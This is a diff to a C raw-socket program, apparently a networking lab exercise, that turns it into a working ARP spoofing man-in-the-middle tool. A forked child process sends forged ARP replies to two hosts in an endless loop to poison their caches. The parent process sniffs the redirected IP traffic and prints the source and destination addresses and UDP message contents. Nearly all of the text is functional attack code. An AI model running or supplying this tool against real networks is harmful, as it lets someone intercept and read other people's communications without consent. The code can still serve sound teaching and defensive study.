@@ -106,7 +106,7 @@ int main(int argc, char *argv[])
 	if_addr.ifr_addr.sa_family = AF_INET;
 	strncpy(if_addr.ifr_name, ifName, IFNAMSIZ-1);
 	if(ioctl(sockfd, SIOCGIFADDR, &if_addr) < 0)
-		perror("SIOCGIFHWADDR");
+		perror("SIOCGIFPADDR");
 	memcpy(my_ip, if_addr.ifr_addr.sa_data+2, 4);
 
 	printf("My MAC: %x:%x%x:%x:%x:%x\n", my_mac[0],my_mac[1],my_mac[2],my_mac[3],my_mac[4],my_mac[5]);
@@ -177,51 +177,81 @@ int main(int argc, char *argv[])
 
 	/* End of configuration. Now we can send and receive data using raw sockets. */
 
+	pid_t pid;
 
-	/* Spoffing time */
+	pid = fork();
 
-	while(1)
+	if(pid < 0)
+		perror("fork");
+
+	if(pid == 0)
 	{
-		buffer_u = fill_arp(pc1_ip, my_mac, pc2_ip, pc2_mac, spoofing_mode);
+	/* Spoofing time! */
 
-		/* Send it.. */
-		printf("sendind PC2\n");
-		memcpy(socket_address.sll_addr, bcast_mac, 6);
-		if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
-		printf("Send failed\n");
+		while(1)
+		{
+			buffer_u = fill_arp(pc1_ip, my_mac, pc2_ip, pc2_mac, spoofing_mode);
 
-		buffer_u = fill_arp(pc2_ip, my_mac, pc1_ip, pc1_mac, spoofing_mode);
+			/* Send it.. */
+			printf("Sending PC2\n");
+			memcpy(socket_address.sll_addr, bcast_mac, 6);
+			if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+			printf("Send failed\n");
 
-		/* Send it.. */
-		printf("sendind PC1\n");
-		memcpy(socket_address.sll_addr, bcast_mac, 6);
-		if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
-		printf("Send failed\n");
+			buffer_u = fill_arp(pc2_ip, my_mac, pc1_ip, pc1_mac, spoofing_mode);
 
-		sleep(5);
+			/* Send it.. */
+			printf("Sending PC1\n");
+			memcpy(socket_address.sll_addr, bcast_mac, 6);
+			if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+			printf("Send failed\n");
+
+			sleep(5);
+		}
 	}
 
-	/* To receive data (in this case we will inspect ARP and IP packets)... */
+	else
+	{
+		/* Sniffing time! */
 
-	while (1){
-		numbytes = recvfrom(sockfd, buffer_u.raw_data, ETH_LEN, 0, NULL, NULL);
-		if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_ARP)){
-			printf("ARP packet, %d bytes - operation %d\n", numbytes, ntohs(buffer_u.cooked_data.payload.arp.operation));
-			//printf("ARP packet srcIP: %s dstIP: %s srcMAC: %s dstMAC: %s\n", buffer_u.cooked_data.payload.arp.src_paddr, buffer_u.cooked_data.payload.arp.src_hwaddr,
-		//buffer_u.cooked_data.payload.arp.tgt_paddr, buffer_u.cooked_data.payload.arp.tgt_hwaddr);
-		printf("IP packet, %d bytes - src ip: %d.%d.%d.%d dst ip: %d.%d.%d.%d proto: %d\n",
-			numbytes,
-			buffer_u.cooked_data.payload.arp.src_paddr[0], buffer_u.cooked_data.payload.arp.src_paddr[1],
-			buffer_u.cooked_data.payload.arp.src_paddr[2], buffer_u.cooked_data.payload.arp.src_paddr[3],
-			buffer_u.cooked_data.payload.arp.tgt_paddr[0], buffer_u.cooked_data.payload.arp.tgt_paddr[1],
-			buffer_u.cooked_data.payload.arp.tgt_paddr[2], buffer_u.cooked_data.payload.arp.tgt_paddr[3],
-			buffer_u.cooked_data.payload.ip.proto
-		);
-			continue;
+			char *p;
+			while (1){
+				numbytes = recvfrom(sockfd, buffer_u.raw_data, ETH_LEN, 0, NULL, NULL);
+				if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_IP)){
+					printf("IP packet, %d bytes - src ip: %d.%d.%d.%d dst ip: %d.%d.%d.%d proto: %d\n",
+						numbytes,
+						buffer_u.cooked_data.payload.ip.src[0], buffer_u.cooked_data.payload.ip.src[1],
+						buffer_u.cooked_data.payload.ip.src[2], buffer_u.cooked_data.payload.ip.src[3],
+						buffer_u.cooked_data.payload.ip.dst[0], buffer_u.cooked_data.payload.ip.dst[1],
+						buffer_u.cooked_data.payload.ip.dst[2], buffer_u.cooked_data.payload.ip.dst[3],
+						buffer_u.cooked_data.payload.ip.proto
+					);
+
+
+					printf("IP packet, %4d bytes - src ip: %15s - dst ip: %15s proto: %2d\n", numbytes,
+						inet_ntoa(*(struct in_addr*)buffer_u.cooked_data.payload.ip.src),
+						inet_ntoa(*(struct in_addr*)buffer_u.cooked_data.payload.ip.dst),
+						buffer_u.cooked_data.payload.ip.proto);
+
+
+					if (buffer_u.cooked_data.payload.ip.proto == PROTO_UDP && buffer_u.cooked_data.payload.udp.udphdr.dst_port == ntohs(DST_PORT)){
+						p = (char *)&buffer_u.cooked_data.payload.udp.udphdr + ntohs(buffer_u.cooked_data.payload.udp.udphdr.udp_len);
+						*p = '\0';
+						printf("UDP packet, %4d bytes - scr port: %4d - dst port: %4d\n",
+							ntohs(buffer_u.cooked_data.payload.udp.udphdr.udp_len),
+							ntohs(buffer_u.cooked_data.payload.udp.udphdr.src_port),
+							ntohs(buffer_u.cooked_data.payload.udp.udphdr.dst_port));
+
+						printf("Message:\n %s\n\n", (char *)&buffer_u.cooked_data.payload.udp.udphdr + sizeof(struct udp_hdr));
+					}
+					else
+						printf("\n");
+					continue;
+				}
 		}
 
-		printf("got a packet, %d bytes\n", numbytes);
 	}
+	/* To receive data (in this case we will inspect ARP and IP packets)... */
 
 	return 0;
 }
